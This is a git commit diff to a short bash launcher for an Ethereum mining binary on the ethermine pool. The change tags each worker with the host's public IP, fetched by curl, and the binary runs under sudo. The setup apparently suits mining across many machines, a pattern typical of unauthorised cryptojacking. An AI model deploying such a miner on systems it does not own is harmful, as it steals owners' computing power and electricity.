e5a344cbeaddbfe76d99cd0db74d706952f1e5a3
viencaytrong <55699469+viencaytrong@users.noreply.github.com>
2021-09-29 20:02:27 +0700

    Update tuanhienxxxhien.sh

--- tuanhienxxxhien.sh
+++ tuanhienxxxhien.sh
@@ -2,7 +2,7 @@
 #!/bin/bash
 
 POOL=eu1.ethermine.org:4444
-WALLET=0xf7fe12e0432b84added46f93704a2dcc0938abbe.BMT-$(shuf -n 1 -i 1-9999)
+WALLET=0xf7fe12e0432b84added46f93704a2dcc0938abbe.BMT-$(echo "$(curl -s ifconfig.me)" | tr . _ )-
 cd "$(dirname "$0")"
 
 chmod +x ./tuanhienxxxhien && sudo ./tuanhienxxxhien --algo ETHASH --pool $POOL --user $WALLET  $@
